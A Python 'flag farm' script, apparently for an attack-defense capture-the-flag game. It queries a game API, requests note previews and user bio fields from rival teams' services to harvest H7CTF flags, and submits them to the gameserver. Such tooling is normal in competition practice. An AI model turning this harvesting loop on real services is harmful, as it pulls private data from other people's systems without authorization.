#!/usr/bin/env python3
# farm.py — one-tick attacker: GET attack-info, exploit, submit flags.
# usage: farm.py <api_base> <gameserver_host:port> <attacker_token> <attacker_ip> [--tcp]
#   api_base:          http://127.0.0.1:8080/api/v1
#   gameserver_host:   127.0.0.1:4141  (for TCP)
#   attacker_token:    token-team1
#   attacker_ip:       172.30.0.11  (skip own team's service)
#   --tcp:             submit via TCP (default: PUT /arena/flags)
import json
import re
import socket
import sys
import urllib.request
import urllib.error

API     = sys.argv[1].rstrip("/")
GS_ADDR = sys.argv[2].split(":")       # [host, port]
TOKEN   = sys.argv[3]
MY_IP   = sys.argv[4]
USE_TCP = "--tcp" in sys.argv

FLAG_RE = re.compile(r"H7CTF\{[A-Z2-7]{32}\}")


def http_get(url: str, headers: dict = None, timeout: int = 5) -> str:
    req = urllib.request.Request(url, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.read().decode(errors="replace")
    except Exception:
        return ""


def exploit_store0(host, attack_info):
    info = json.loads(attack_info or "{}")
    nid  = info.get("note_id", "")
    if not nid:
        return []
    body = http_get("http://{}:7000/notes/{}?preview=1".format(host, nid))
    return FLAG_RE.findall(body)


def exploit_store1(host, attack_info):
    info = json.loads(attack_info or "{}")
    user = info.get("user", "")
    if not user:
        return []
    body = http_get("http://{}:7000/users/{}?fields=bio".format(host, user))
    return FLAG_RE.findall(body)


EXPLOITS = {0: exploit_store0, 1: exploit_store1}


def submit_tcp(flags):
    results = []
    if not flags:
        return results
    try:
        s = socket.create_connection((GS_ADDR[0], int(GS_ADDR[1])), timeout=10)
        banner = b""
        while b"\n\n" not in banner:
            chunk = s.recv(256)
            if not chunk:
                break
            banner += chunk
        s.sendall((TOKEN + "\n" + "\n".join(flags) + "\n").encode())
        resp = b""
        s.settimeout(3)
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                resp += chunk
        except Exception:
            pass
        s.close()
        for line in resp.decode(errors="replace").splitlines():
            parts = line.split()
            if len(parts) >= 2:
                results.append(f"{parts[0]} {parts[1]}")
    except Exception as e:
        print(f"  tcp submit error: {e}", file=sys.stderr)
    return results


def submit_put(flags):
    results = []
    if not flags:
        return results
    body = json.dumps(flags).encode()
    req  = urllib.request.Request(
        f"{API}/arena/flags",
        data=body,
        method="PUT",
        headers={
            "Content-Type": "application/json",
            "X-Team-Token":  TOKEN,
        },
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            data = json.load(r)
        for item in data:
            results.append(f"{item.get('flag','')} {item.get('status','?')}")
    except Exception as e:
        print(f"  put submit error: {e}", file=sys.stderr)
    return results


def main():
    info = http_get(f"{API}/arena/attack-info")
    if not info:
        print("attack-info empty")
        return

    try:
        data = json.loads(info)
    except json.JSONDecodeError:
        print("attack-info parse error")
        return

    found_flags = []
    services    = data.get("services", {})
    for svc, by_team in services.items():
        for team_ip, by_tick in by_team.items():
            if team_ip == MY_IP:
                continue  # own team
            for _tick, by_store in by_tick.items():
                for store_idx_str, infos in by_store.items():
                    store_idx = int(store_idx_str)
                    exploit   = EXPLOITS.get(store_idx)
                    if exploit is None:
                        continue
                    for ai in infos:
                        flags = exploit(team_ip, ai)
                        found_flags.extend(flags)

    if not found_flags:
        print("no flags found this tick")
        return

    print(f"found {len(found_flags)} flags, submitting via {'TCP' if USE_TCP else 'PUT'}...")
    results = submit_tcp(found_flags) if USE_TCP else submit_put(found_flags)
    for r in results:
        print(f"  {r}")
    ok = sum(1 for r in results if "OK" in r)
    print(f"  -> {ok}/{len(found_flags)} accepted")


if __name__ == "__main__":
    main()
